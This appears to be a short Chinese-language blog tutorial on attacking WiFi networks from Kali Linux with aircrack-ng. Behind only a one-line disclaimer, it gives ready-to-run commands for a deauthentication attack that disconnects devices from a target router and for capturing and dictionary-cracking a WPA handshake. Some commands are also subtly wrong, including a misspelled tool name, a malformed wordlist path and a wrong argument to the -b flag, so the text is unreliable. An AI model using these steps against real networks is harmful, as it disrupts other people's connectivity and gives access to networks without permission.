---
title: 基于Kali的WiFi攻击
date: 2023.01.28 16:30:04
author: xeonds
toc: true
excerpt: 通过aircrack-ng，我们能够瘫痪路由器，或者破解WiFi的密码。
categories:
  - 计算机科学
---

>仅限于合法用途，责任自负
>Legal purpose only, do it at your own risk.

## 准备

1. 检查网卡情况

在终端输入 `ifconfig` , 如果看到 `wlan0` , 就进行下一步。

2. 启动监控模式

用下面的命令启动设备：

```bash
arimon-ng start wlan0
```

然后在`ifconfig`的输出中，你就能看到名叫`wlan0mon`的设备。然后输入

```bash
airodump-ng wlan0mon
```

来启动监听。用下面的指令停止监听：

```bash
airmon-ng stop wlan0mon
```

## 断网攻击

扫出来目标设备之后，用`ctrl+c`停止扫描，然后再开个终端，输入

```bash
aireplay-ng -0 0 -a [BSSID] wlan0mon
```

然后回来这个终端，输入

```bash
airodump-ng -c [CH] --bssid [BSSID] -w ~/ wlan0mon
```

然后连接那个路由器WiFi的设备应该就会断联了。

## 破解密码

当你捕捉到这样的握手包  `WPA handshake: [PACKAGE]`时， `Ctrl+c`停止指令

然后输入

```bash
aircrack-ng -a2 -b [PACKAGE] -w [PATH-TO-PASS-DICTIONARY] ~/*.cap
```

Kali的自带字典一般在这： `/fs/usr/share/wordlists/rockyou.txt.gz`. 解压，然后把`rockyou.txt`的路径替换到上边，回车。然后应该就能获取到密码了。
